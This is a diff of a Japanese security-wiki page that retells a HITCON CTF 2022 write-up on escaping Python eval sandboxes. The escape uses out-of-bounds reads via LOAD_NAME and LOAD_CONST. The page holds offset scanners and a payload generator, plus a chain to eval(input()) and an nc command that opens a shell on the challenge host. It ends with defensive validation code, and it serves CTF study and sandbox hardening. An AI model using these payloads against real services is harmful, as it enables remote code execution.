@@ -1,31 +1,33 @@
 # LOAD_NAME / LOAD_CONST opcode OOB Read
 
+{{#include ../../../banners/hacktricks-training.md}}
+
 このページでは、Splitline による HITCON CTF 2022「V O I D」の元の writeup と exploit chain を応用しています。<sup>[[1]](#references)</sup>
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-`LOAD_NAME` または `LOAD_CONST` の operand は、意図的に短縮された `co_names` または `co_consts` tuple の範囲外を読み取れます。この challenge では、近くのエントリに `__getattribute__` などの有用な attribute が含まれるまで、到達不能なダミー name が使用されます。<sup>[[1]](#references)</sup>
+`LOAD_NAME` または `LOAD_CONST` のオペランドは、意図的に短縮された `co_names` または `co_consts` tuple の外側を読み取ることができます。この challenge では、近くのエントリに `__getattribute__` などの有用な attribute が含まれるまで、到達不能な dummy names が使用されます。<sup>[[1]](#references)</sup>
 
-残りの payload では、復元した name を再利用して sandbox escape を構築します。<sup>[[1]](#references)</sup>
+残りの payload では、取得した name を再利用して sandbox escape を構築します。<sup>[[1]](#references)</sup>
 
 ### Overview <a href="#overview-1" id="overview-1"></a>
 
-challenge wrapper は短く、評価する前に 1 つの expression を compile します。<sup>[[1]](#references)</sup>
+challenge wrapper は短く、評価する前に1つの expression を compile します。<sup>[[1]](#references)</sup>
 ```python
 source = input('>>> ')
 if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
 print(eval(code, {'__builtins__': {}}))
 ```
-入力は Python code object にコンパイルされ、その後 wrapper は `eval` を呼び出す前に、`co_consts` と `co_names` を空の tuple に置き換えます。<sup>[[1]](#references)[[5]](#references)</sup>
+入力は Python code object にコンパイルされ、その後 wrapper が `eval` を呼び出す前に、`co_consts` と `co_names` を空の tuple に置き換えます。<sup>[[1]](#references)[[5]](#references)</sup>
 
-これらの table のいずれかに対して index を指定する生成済みの instruction は、build によっては interpreter をクラッシュさせたり、隣接する object pointer を expose したりする可能性があります。<sup>[[1]](#references)</sup>
+生成された instruction がこれらの table のいずれかを依然として index すると、build によっては interpreter が crash したり、隣接する object pointer が expose されたりします。<sup>[[1]](#references)</sup>
 
-### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>
+### 範囲外読み取り <a href="#out-of-bound-read" id="out-of-bound-read"></a>
 
 segfault はどのように発生するのでしょうか？
 
-`[a, b, c]` のような list expression の場合、compiler は連続した operand を持つ `LOAD_NAME` instructions を生成します。<sup>[[1]](#references)[[2]](#references)</sup>
+`[a, b, c]` のような list expression では、compiler は連続した operand を持つ `LOAD_NAME` instruction を生成します。<sup>[[1]](#references)[[2]](#references)</sup>
 ```
 1           0 LOAD_NAME                0 (a)
 2 LOAD_NAME                1 (b)
@@ -33,11 +35,11 @@ segfault はどのように発生するのでしょうか？
 6 BUILD_LIST               3
 8 RETURN_VALUE
 ```
-`co_names` が `()` に置き換えられても、bytecode には依然として `LOAD_NAME 2` が含まれます。そのため、チェックされていない tuple アクセスにより、`IndexError` を発生させる代わりに tuple の外部にあるポインタを取得できます。<sup>[[1]](#references)[[3]](#references)</sup>
+`co_names` を `()` に置き換えても、バイトコードには `LOAD_NAME 2` が残ります。そのため、未検査のタプルアクセスによって `IndexError` を発生させる代わりに、タプルの外部にあるポインタを取得できます。<sup>[[1]](#references)[[3]](#references)</sup>
 
-ここでの中核となる primitive は `LOAD_NAME` と `LOAD_CONST` です。これらの整数オペランドは、それぞれ `co_names` と `co_consts` のエントリを選択します。<sup>[[1]](#references)[[2]](#references)</sup>
+`LOAD_NAME` と `LOAD_CONST` はここでの中核となるプリミティブです。それぞれの整数オペランドによって、`co_names` と `co_consts` 内のエントリが選択されます。<sup>[[1]](#references)[[2]](#references)</sup>
 
-CPython の dispatch では、`LOAD_CONST` が選択された tuple エントリを取得して push します。release build では、チェックされていない tuple accessor が使用されます。<sup>[[3]](#references)</sup>
+CPython のディスパッチでは、`LOAD_CONST` が選択されたタプルエントリを取得してプッシュします。リリースビルドでは、未検査のタプルアクセサが使用されます。<sup>[[3]](#references)</sup>
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -47,22 +49,22 @@ PUSH(value);
 FAST_DISPATCH();
 }
 ```
-対象の interpreter で `LOAD_NAME` のオペランドを増加させながら probe し、有用なエントリを特定します。Splitline は challenge 環境で 700 を超える位置に有用な offset があることを確認しましたが、layout は build ごとに異なります。debugger を使うと、周辺メモリを調査できます。<sup>[[1]](#references)</sup>
+対象の interpreter で `LOAD_NAME` のオペランドを増加させながら調査し、有用なエントリをマッピングします。Splitline は challenge 環境で 700 を超える位置に有用なオフセットがあることを確認しましたが、配置は build ごとに異なります。debugger を使うと、周辺メモリの調査に役立ちます。<sup>[[1]](#references)</sup>
 
 ### Exploit の生成 <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-offset から有用な name が得られたら、到達不能な式に範囲外の lookup を配置し、到達可能な attribute access から同じ `co_names` の slot を参照します。<sup>[[1]](#references)</sup>
+オフセットから有用な name が得られたら、到達不能な式内に範囲外 lookup を配置し、到達可能な attribute access から同じ `co_names` スロットを参照します。<sup>[[1]](#references)</sup>
 
-たとえば offset 5 から `__getattribute__` が得られる場合は、その name を slot 5 に保持し、false branch で有用な lookup を実行します。<sup>[[1]](#references)</sup>
+たとえば、オフセット 5 から `__getattribute__` が得られる場合は、その name をスロット 5 に保持し、false branch で有用な lookup を実行します。<sup>[[1]](#references)</sup>
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
 ]
 ```
-> 復元されたテキストは `__getattribute__` である必要はありません。payload の役割を果たす任意の identifier がその slot を占有できます。<sup>[[1]](#references)</sup>
+> 復元されるテキストは `__getattribute__` である必要はなく、payload の役割を果たす任意の identifier がそのスロットを占有できます。<sup>[[1]](#references)</sup>
 
-コンパイラは、disassembly が示すように、同じ name が繰り返し現れる場合に `co_names` の slot を再利用します。<sup>[[1]](#references)[[2]](#references)</sup>
+compiler は、1つの name が繰り返し出現する場合に `co_names` スロットを再利用します。disassembly にその様子が示されています。<sup>[[1]](#references)[[2]](#references)</sup>
 ```python
 0 BUILD_LIST               0
 2 POP_JUMP_IF_FALSE       20
@@ -79,9 +81,9 @@ offset から有用な name が得られたら、到達不能な式に範囲外�
 24 BUILD_LIST               1
 26 RETURN_VALUE
 ```
-`LOAD_ATTR` も `co_names` を通じて名前を解決するため、到達可能な分岐ではそのスロットを再利用できます。新しい CPython バージョンにおける packed operands については、以下のバージョンノートで説明しています。<sup>[[1]](#references)[[2]](#references)</sup>
+`LOAD_ATTR` も `co_names` を通じて名前を解決するため、到達可能な分岐ではそのスロットを再利用できます。新しい CPython バージョンでの packed operands については、以下の version notes で説明しています。<sup>[[1]](#references)[[2]](#references)</sup>
 
-小さな非負整数は、constants を使わずに boolean expressions から合成できます。<sup>[[1]](#references)</sup>
+定数を使わずに、boolean expressions から小さな非負整数を合成できます。<sup>[[1]](#references)</sup>
 
 - 0: not \[\[]]
 - 1: not \[]
@@ -90,7 +92,7 @@ offset から有用な name が得られたら、到達不能な式に範囲外�
 
 ### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>
 
-元の exploit は、challenge の length limit 内に収めるため、constants ではなく names を使用していました。<sup>[[1]](#references)</sup>
+元の exploit では、challenge の長さ制限内に収めるため、constants ではなく names を使用していました。<sup>[[1]](#references)</sup>
 
 この helper は、空の `co_names` tuple を持つ code object を構築することで、候補となる name offsets をスキャンします。<sup>[[1]](#references)</sup>
 ```python
@@ -127,7 +129,7 @@ print(f'{n}: {ret}')
 
 # for i in $(seq 0 10000); do python find.py $i ; done
 ```
-以下の generator は、復元された offset を名前に対応付け、ソースレベルの payload を生成します。<sup>[[1]](#references)</sup>
+以下のジェネレーターは、復元したオフセットを名前に対応付け、ソースレベルのペイロードを出力します。<sup>[[1]](#references)</sup>
 ```python
 import sys
 import unicodedata
@@ -204,7 +206,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-大まかには、生成された payload は関数の globals を取得し、`builtins` を復元して、`eval(input())` を呼び出します。<sup>[[1]](#references)</sup>
+大まかには、生成されたpayloadは関数のglobalsを取得し、`builtins`を復元して、`eval(input())`を呼び出します。<sup>[[1]](#references)</sup>
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -221,17 +223,17 @@ builtins['eval'](builtins['input']())
 
 ### Version notes and affected opcodes (Python 3.11–3.13)
 
-- CPython 3.11–3.13 では、命令は依然として整数オペランドを使用して code object の定数テーブルおよび名前テーブルをインデックス参照します。いずれかの tuple が参照されたインデックスより短い場合、チェックされていないアクセスによって隣接する object pointer が読み取られ、crash したり、その object pointer に対して処理を実行したりする可能性があります。正確な挙動は interpreter build によって異なります。<sup>[[2]](#references)[[3]](#references)</sup>
-- `LOAD_CONST consti` および (3.12+) `RETURN_CONST consti` は `co_consts[consti]` を読み取ります。<sup>[[2]](#references)</sup>
-- 直接 name-table を使用するものには、`LOAD_NAME`、`STORE_NAME`、`DELETE_NAME`、`STORE_GLOBAL`、`DELETE_GLOBAL`、`IMPORT_NAME`、`IMPORT_FROM`、`STORE_ATTR`、`DELETE_ATTR`、および (3.12+) `LOAD_FROM_DICT_OR_GLOBALS` があります。<sup>[[2]](#references)</sup>
-- `LOAD_GLOBAL namei` および `LOAD_ATTR namei` は `co_names[namei >> 1]` を使用します。下位ビットは、documented な NULL/method behavior を制御します。(3.12+) `LOAD_SUPER_ATTR namei` は `co_names[namei >> 2]` を使用し、下位ビットに2つの flag を格納します。<sup>[[2]](#references)</sup>
-- Python 3.11+ では、命令間に hidden な `CACHE` entry を追加する adaptive/inline cache が導入されました。handcrafted bytecode で `co_code` を構築する場合は、これらの entry を考慮する必要があります。<sup>[[2]](#references)</sup>
+- CPython 3.11–3.13 では、命令は引き続き整数オペランドを使用して、code object の constant table と name table のインデックスを指定します。いずれかの tuple が参照されたインデックスより短い場合、チェックされていないアクセスによって隣接する object pointer が読み取られ、それを使って crash したり処理を実行したりする可能性があります。正確な挙動は interpreter build によって異なります。<sup>[[2]](#references)[[3]](#references)</sup>
+- `LOAD_CONST consti` と (3.12+) `RETURN_CONST consti` は `co_consts[consti]` を読み取ります。<sup>[[2]](#references)</sup>
+- name table を直接使用するものには、`LOAD_NAME`、`STORE_NAME`、`DELETE_NAME`、`STORE_GLOBAL`、`DELETE_GLOBAL`、`IMPORT_NAME`、`IMPORT_FROM`、`STORE_ATTR`、`DELETE_ATTR`、および (3.12+) `LOAD_FROM_DICT_OR_GLOBALS` があります。<sup>[[2]](#references)</sup>
+- `LOAD_GLOBAL namei` と `LOAD_ATTR namei` は `co_names[namei >> 1]` を使用します。low bit は documented NULL/method behavior を制御します。(3.12+) `LOAD_SUPER_ATTR namei` は `co_names[namei >> 2]` を使用し、low bits に2つの flag をパックします。<sup>[[2]](#references)</sup>
+- Python 3.11+ では adaptive/inline caches が導入され、命令の間に hidden `CACHE` entries が追加されます。handcrafted bytecode を作成する際は、`co_code` の構築時にこれらの entries を考慮する必要があります。<sup>[[2]](#references)</sup>
 
-実際的な意味として、bytecode の layout と復元された offset は release および build 固有です。これに依存する前に、対象の CPython version に対して technique と生成した payload をテストしてください。<sup>[[2]](#references)</sup>
+実用上の意味：bytecode の layout と復元した offsets は、release と build に固有です。この technique や生成した payload に依存する前に、対象の CPython version に対してテストしてください。<sup>[[2]](#references)</sup>
 
-### Quick scanner for useful OOB indexes (3.11+/3.12+ compatible)
+### 有用な OOB indexes 用の Quick scanner (3.11+/3.12+ compatible)
 
-high-level source ではなく bytecode から直接興味深い object を probe したい場合は、最小限の code object を生成して index を brute-force できます。以下の helper は、対象 interpreter の `dis` metadata に従って inline cache を挿入します。<sup>[[2]](#references)</sup>
+high-level source ではなく bytecode から直接 interesting objects を探したい場合は、最小限の code objects を生成し、indexes を brute-force できます。以下の helper は、対象 interpreter の `dis` metadata に従って inline caches を挿入します。<sup>[[2]](#references)</sup>
 ```python
 import dis, types
 
@@ -270,13 +272,13 @@ obj = probe_const(idx)
 if obj is not None:
 print(idx, type(obj), repr(obj)[:80])
 ```
-注意
+Notes
 - 代わりに names を probe するには、`LOAD_CONST` を `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` に置き換え、対象 opcode に合わせて stack の使用方法と packed operand を調整します。<sup>[[2]](#references)</sup>
-- 必要に応じて `EXTENDED_ARG` または `arg` の複数バイトを使用して、255 より大きい index に到達します。この helper は operand の下位バイトのみを出力するため、より大きな index には raw byte の構築または複数の load が必要です。<sup>[[2]](#references)</sup>
+- 必要に応じて、`EXTENDED_ARG` または `arg` の複数バイトを使用して、255 を超える index に到達します。この helper は operand の下位バイトのみを出力するため、より大きな index には raw byte の構築または複数回の load が必要です。<sup>[[2]](#references)</sup>
 
-### 最小限の bytecode-only RCE pattern（co_consts OOB → builtins → eval/input）
+### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)
 
-builtins module に解決される `co_consts` index を特定したら、stack を操作することで `co_names` なしに `eval(input())` を再構築できます。公式の B01lers CTF 2024 `awpcode` の資料では、この同じ OOB-read pattern が解説されています。<sup>[[4]](#references)</sup>
+`co_consts` index が builtins module に解決されることを特定したら、stack を操作することで、`co_names` を使わずに `eval(input())` を再構築できます。公式の B01lers CTF 2024 `awpcode` の資料では、この同じ OOB-read pattern が解説されています。<sup>[[4]](#references)</sup>
 ```python
 # Build co_code that:
 # 1) LOAD_CONST <builtins_idx> → push builtins module
@@ -285,13 +287,13 @@ builtins module に解決される `co_consts` index を特定したら、stack 
 # 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
 # This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
 ```
-このスタックのみを使用するアプローチは、`co_code` を直接制御できる一方で `co_consts=()` と `co_names=()` を強制される challenge で有用です。ソースレベルの tricks を避け、bytecode のスタック操作と tuple builders を使って payload を小さく保てます。<sup>[[4]](#references)</sup>
+このスタックのみのアプローチは、challenge で `co_code` を直接制御できる一方、`co_consts=()` と `co_names=()` を強制される場合に有用です。ソースレベルの tricks を回避し、bytecode のスタック操作と tuple builders を使用して payload を小さく保てます。<sup>[[4]](#references)</sup>
 
-### sandbox の defensive checks と mitigation
+### sandbox の Defensive checks と mitigations
 
-untrusted code を compile または evaluate する Python sandbox を作成する場合、bytecode で使用される tuple index の bounds-check を CPython に依存しないでください。実行前に code object を validate してください。<sup>[[2]](#references)[[3]](#references)</sup>
+untrusted code を compile または evaluate する Python sandbox を作成する場合、bytecode で使用される tuple indexes の bounds-checking を CPython に依存しないでください。実行前に code objects を validate してください。<sup>[[2]](#references)[[3]](#references)</sup>
 
-実用的な validator（`co_consts`/`co_names` への OOB access を reject します）。<sup>[[2]](#references)</sup>
+Practical validator（`co_consts`/`co_names` への OOB access を reject）。<sup>[[2]](#references)</sup>
 ```python
 import dis
 
@@ -329,13 +331,13 @@ raise ValueError("Bytecode refers to name index beyond co_names length")
 # validate_code_object(c)
 # eval(c, {'__builtins__': {}})
 ```
-追加の緩和策のアイデア
-- 信頼できない入力に対する任意の `CodeType.replace(...)` を許可しないか、結果の code object に対して厳格な構造チェックを追加する。
-- CPython のセマンティクスに依存するのではなく、OS-level sandboxing（seccomp、job objects、containers）を使用して、信頼できない code を別のプロセスで実行することを検討する。
+追加の mitigation ideas
+- 信頼できない入力に対して任意の `CodeType.replace(...)` を許可しないか、生成される code object に対して厳格な構造チェックを追加する。
+- CPython のセマンティクスに依存するのではなく、OS-level sandboxing（seccomp、job objects、containers）を使用した separate process で untrusted code を実行することを検討する。
 
 ## References
 
-- [1] [Splitline の HITCON CTF 2022 writeup「V O I D」（この technique と high-level exploit chain の起源）](https://blog.splitline.tw/hitcon-ctf-2022/)
+- [1] [Splitline の HITCON CTF 2022 writeup「V O I D」（この technique と high-level exploit chain の発端）](https://blog.splitline.tw/hitcon-ctf-2022/)
 - [2] [Python 3.13 `dis` documentation（bytecode indices、packed name operands、inline caches）](https://docs.python.org/3.13/library/dis.html)
 - [3] [CPython 3.13.5 tuple-access macros（`GETITEM`）](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
 - [4] [B01lers CTF 2024 `awpcode` challenge writeup（CygnusX）](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
